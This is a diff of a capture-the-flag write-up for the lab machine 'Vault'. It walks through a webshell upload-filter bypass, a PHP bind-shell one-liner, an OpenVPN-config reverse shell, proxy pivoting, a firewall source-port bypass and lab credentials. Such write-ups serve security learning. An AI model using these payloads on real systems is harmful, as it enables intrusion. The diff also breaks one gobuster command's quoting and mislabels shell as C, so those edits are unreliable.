@@ -15,7 +15,7 @@ Let's get straight into it!
 A quick top 10000 TCP port scan reveals that ports 22 and 80 are open, so we do
 a version scan on them:
 
-```bash
+```c {hl_lines=[1]}
 $ nmap 10.10.10.109 -sV -p22,80
 Starting Nmap 7.70 ( https://nmap.org ) at 2018-11-12 14:06 AEDT
 Nmap scan report for 10.10.10.109
@@ -28,16 +28,16 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Visiting the website on port 80, we are greeted with a static page with generic information on it. Trying gobuster to brute force sub-pages as follows unfortunately returns no useful results:
 
-```bash
+```c
 $ gobuster -u http://10.10.10.109 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 ```
 
 I was a bit stuck at where to get started, but then decided to look at the
 message on the main page as a hint. The message included custom words, which may help us find a custom path on the website. So, let's try get a list of all words on the page and see if we can gobust anything useful with those terms:
 
-```bash
-$ cewl http://10.10.10.109 | tr '[:upper:]' '[:lower:]' > cewl-vault.txt
-$ gobuster -u http://10.10.10.109 -w cewl-vault.txt
+```c {hl_lines=[1,2]}
+$ cewl "http://10.10.10.109" | tr "[:upper:]" "[:lower:]" > cewl-vault.txt
+$ gobuster -u "http://10.10.10.109 -w cewl-vault.txt"
 =====================================================
 Gobuster v2.0.1              OJ Reeves (@TheColonial)
 =====================================================
@@ -64,7 +64,7 @@ forwarded to `/sparklays/`  and then greeted with a Forbidden error!
 
 So let's keep looking deeper into the `sparklays` folder:
 
-```bash
+```c {hl_lines=[1]}
 $ gobuster -u http://10.10.10.109/sparklays/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 /design (Status: 301)
 ```
@@ -72,7 +72,7 @@ $ gobuster -u http://10.10.10.109/sparklays/ -w /usr/share/wordlists/dirbuster/d
 Visiting `http://10.10.10.109/sparklays/design` forwards us to `/sparklays/design/`
 and then also shows a Forbidden error. Let's try to continue going deeper!
 
-```bash
+```c {hl_lines=[1]}
 $ gobuster -u http://10.10.10.109/sparklays/design/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 /uploads (Status: 301)
 ```
@@ -83,7 +83,7 @@ Unfortunately, running `gobuster` again on this URL returns no useful results. N
 
 Let's try `gobuster` with a few different file formats, like `php,jsp,asp,aspx,do,html`, which are commonly found on web servers:
 
-```bash
+```c {hl_lines=[1]}
 $ gobuster -u http://10.10.10.109/sparklays/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,jsp,asp,aspx,do,html
 /login.php (Status: 200)
 /admin.php (Status: 200)
@@ -98,7 +98,7 @@ asking for a username and a password. At first thoughts, we could try some SQL
 injection or try to guess usernames and passwords, but first, let's keep looking
 for more PHP and HTML files under the other folders:
 
-```bash
+```c {hl_lines=[1]}
 $ gobuster -u http://10.10.10.109/sparklays/design/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html
 /uploads (Status: 301)
 /design.html (Status: 200)
@@ -131,7 +131,7 @@ extensions, use a null character, or try other extensions like `php5` and `php3`
 Skipping the trial and error, we find that we can bypass the upload filter using `.php5` extension! The following is the POST request on the upload form with our
 simple-backdoor file being sent with a `.php5` extension:
 
-```
+```http
 POST /sparklays/design/changelogo.php HTTP/1.1
 Host: 10.10.10.109
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
@@ -174,11 +174,11 @@ www-data
 ```
 
 Unfortunately I didn't have much luck with gaining a reverse shell through this
-webshell, however I then decided to try a bind shell. The following is a
+webshell, however I then decided to try a **bind shell**. The following is a
 one-liner bind shell in PHP that will open a socket on port 2222 on the
 compromised host:
 
-```bash
+```c
 $ php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",2222);socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,"$ ",2))exit;$in=socket_read($cl,100);$cmd=popen("$in","r");while(!feof($cmd)){$m=fgetc($cmd);socket_write($cl,$m,strlen($m));}}'
 ```
 
@@ -190,7 +190,7 @@ http://10.10.10.109/sparklays/design/uploads/simple-backdoor.php5?cmd=php -r '$s
 
 Then, connecting to port 2222 on Vault gives us access as `www-data`:
 
-```bash
+```c {hl_lines=[1,2]}
 $ nc 10.10.10.109 2222
 $ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
@@ -198,7 +198,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 Looking through the `/home` folders on the server, we find users named `alex` and `dave`, and we find some interesting files on Dave's Desktop:
 
-```bash
+```c {hl_lines=[1,8]}
 $ ls -al /home/dave/Desktop
 total 20
 drwxr-xr-x  2 dave dave 4096 Nov 12 04:09 .
@@ -224,7 +224,7 @@ two IP addresses. We first setup a SSH dynamic port forward using the `-D` flag,
 and provide the password that we found in the `ssh` file for dave. We then setup
 proxychains to use `127.0.0.1:8081` as a socks proxy, and nmap scan the `/24` subnet as follows:
 
-```bash
+```c
 $ ssh -D 8081 dave@10.10.10.109
 $ proxychains nmap 192.168.122.0/24
 ```
@@ -232,7 +232,7 @@ $ proxychains nmap 192.168.122.0/24
 Alternatively, I also found that I could use python on the host, so I tried the
 port scanner from [here](https://stackoverflow.com/questions/26174743/making-a-fast-port-scanner) after SSH'ing as dave:
 
-```bash
+```c {hl_lines=[1,6]}
 dave@ubuntu:~$ python3 scan.py
 Enter host IP: 192.168.122.4
 How many seconds the socket is going to wait until timeout: 1
@@ -262,7 +262,7 @@ that we update can be retrieved from the web server. Unfortunately, gobuster
 didn't work well with a SOCKS proxy, but I was able to use `wfuzz` to look for
 files with the extension of `vpn` or `ovpn` as follows:
 
-```bash
+```c {hl_lines=[1]}
 $ wfuzz -p 127.0.0.1:8081:SOCKS4 -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -z list,vpn-ovpn --hc 404 http://192.168.122.4/FUZZ.FUZ2Z
 
 ********************************************************
@@ -288,7 +288,7 @@ Awesome, now we can move to finding a way to get code execution through this ovp
 We may have to setup a VPN server on our compromised host (named `ubuntu`) so that the connection is successful, but let's try uploading a test config to give us a
 reverse shell:
 
-```
+```vpn
 remote 192.168.122.1
 ifconfig 10.200.0.2 10.200.0.1
 dev tun
@@ -303,10 +303,10 @@ to port `61234` also on `192.168.122.1`.
 
 We submit the above config through `/vpnconfig.php` and start a `nc` listener on `ubuntu`:
 
-```bash
+```c {hl_lines=[1,6]}
 dave@ubuntu:~$ nc -nvlp 61234
 Listening on [0.0.0.0] (family 0, port 61234)
-Connection from [192.168.122.4] port 61234 [tcp/*] accepted (family 2, sport 58498)
+Connection from [192.168.122.4] port 61234 [tcp/] accepted (family 2, sport 58498)
 bash: cannot set terminal process group (1072): Inappropriate ioctl for device
 bash: no job control in this shell
 root@DNS:/var/www/html# id
@@ -321,7 +321,7 @@ anyway! This time the host's name is `DNS` and we are running as `root`.
 Looking around for more interesting files, we find DNS's password on the user's
 desktop, and we also retrieve `user.txt` from dave's home folder:
 
-```bash
+```c {hl_lines=[1,7,10]}
 root@DNS:/var/www/DNS/desktop# ls -al
 total 12
 drwxrwxr-x 2 root root 4096 Jul 17 10:34 .
@@ -343,7 +343,7 @@ Let's move on to privesc!
 
 We find another interesting file named `interfaces` in DNS's main folder:
 
-```bash
+```c {hl_lines=[1]}
 root@DNS:/var/www/DNS# cat interfaces
 auto ens3
 iface ens3 inet static
@@ -364,7 +364,7 @@ target next. After a lot of scanning, I wasn't finding anything interesting. I
 then decided to look at logs on the DNS server, and finally found something
 interesting:
 
-```bash
+```c {hl_lines=[1]}
 root@DNS:/home/dave# grep -ra "192.168.5" /var/log . 2>/dev/null
 /var/log/auth.log:Jul 24 15:07:21 DNS sshd[1536]: Accepted password for dave from 192.168.5.2 port 4444 ssh2
 /var/log/auth.log:Jul 24 15:07:21 DNS sshd[1566]: Received disconnect from 192.168.5.2 port 4444:11: disconnected by user
@@ -384,7 +384,7 @@ Noting that both ncat and nmap commands were run with specific source ports, and
 To test our assumption, we connect to the port that was connected to in the
 above commands using `ncat` with a source port of `4444`:
 
-```bash
+```c {hl_lines=[1]}
 root@DNS:/home/dave# ncat -p 4444 192.168.5.2 987
 SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.4
 ```
@@ -393,7 +393,7 @@ Awesome! We see that a SSH server is actually running on port `987` on `192.168.
 forward connections to the SSH server from a source port of `53`, and we
 successfully login with the credentials `dave:dav3gerous567`:
 
-```bash
+```c {hl_lines=[1,2,10]}
 root@DNS:/home/dave# /usr/bin/ncat -l 1234 --sh-exec "ncat 192.168.5.2 987 -p 53"
 root@DNS:~$ ssh dave@127.0.0.1 -p1234
 The authenticity of host '[127.0.0.1]:1234 ([127.0.0.1]:1234)' can't be established.
@@ -412,7 +412,7 @@ have `root.txt`!
 
 We do however find the following file on dave's home folder:
 
-```bash
+```c
 dave@vault:~$ cat root.txt.gpg | base32
 QUBAYA6HPDDBBUPLD4BQCEAAUCMOVUY2GZXH4SL5RXIOQQYVMY4TAUFOZE64YFASXVITKTD56JHDLIHBLW3OQMKSHQDUTH3R6QKT3MUYPL32DYMUVFHTWRVO5Q3YLSY2R4K3RUOYE5YKCP2PAX7S7OJBGMJKKZNW6AVN6WGQNV5FISANQDCYJI656WFAQCIIHXCQCTJXBEBHNHGQIMTF4UAQZXICNPCRCT55AUMRZJEQ2KSYK7C3MIIH7Z7MTYOXRBOHHG2XMUDFPUTD5UXFYGCWKJVOGGBJK56OPHE25OKUQCRGVEVINLLC3PZEIAF6KSLVSOLKZ5DWWU34FH36HGPRFSWRIJPRGS4TJOQC3ZSWTXYPORPUFWEHEDOEOPWHH42565HTDUZ6DPJUIX243DQ45HFPLMYTTUW4UVGBWZ4IVV33LYYIB32QO3ONOHPN5HRCYYFECKYNUVSGMHZINOAPEIDO7RXRVBKMHASOS6WH5KOP2XIV4EGBJGM4E6ZSHXIWSG6EM6ODQHRWOAB3AGSLQ5ZHJBPDQ6LQ2PVUMJPWD2N32FSVCEAXP737LZ56TTDJNZN6J6OWZRTP6PBOERHXMQ3ZMYJIUWQF5GXGYOYAZ3MCF75KFJTQAU7D6FFWDBVQQJYQR6FNCH3M3Z5B4MXV7B3ZW4NX5UHZJ5STMCTDZY6SPTKQT6G5VTCG6UWOMK3RYKMPA2YTPKVWVNMTC62Q4E6CZWQAPBFU7NM652O2DROUUPLSHYDZ6SZSO72GCDMASI2X3NGDCGRTHQSD5NVYENRSEJBBCWAZTVO33IIRZ5RLTBVR7R4LKKIBZOVUSW36G37M6PD5EZABOBCHNOQL2HV27MMSK3TSQJ4462INFAB6OS7XCSMBONZZ26EZJTC5P42BGMXHE27464GCANQCRUWO5MEZEFU2KVDHUZRMJ6ABNAEEVIH4SS65JXTGKYLE7ED4C3UV66ALCMC767DKJTBKTTAX3UIRVNBQMYRI7XY=
 ```
@@ -426,7 +426,7 @@ compromised to see if I can find any stored GPG keys.
 
 To my luck, I find the first host that I compromised has a GPG key!
 
-```bash
+```c {hl_lines=[1]}
 dave@ubuntu:~$ gpg --list-keys
 /home/dave/.gnupg/pubring.gpg
 
@@ -442,7 +442,7 @@ GPG private key!
 
 We then use the following commands to decrypt `root.txt`:
 
-```bash
+```c {hl_lines=[1,2]}
 dave@ubuntu:~/Documents$ base32 -d blah.32 > blah
 dave@ubuntu:~/Documents$ gpg -d blah
 
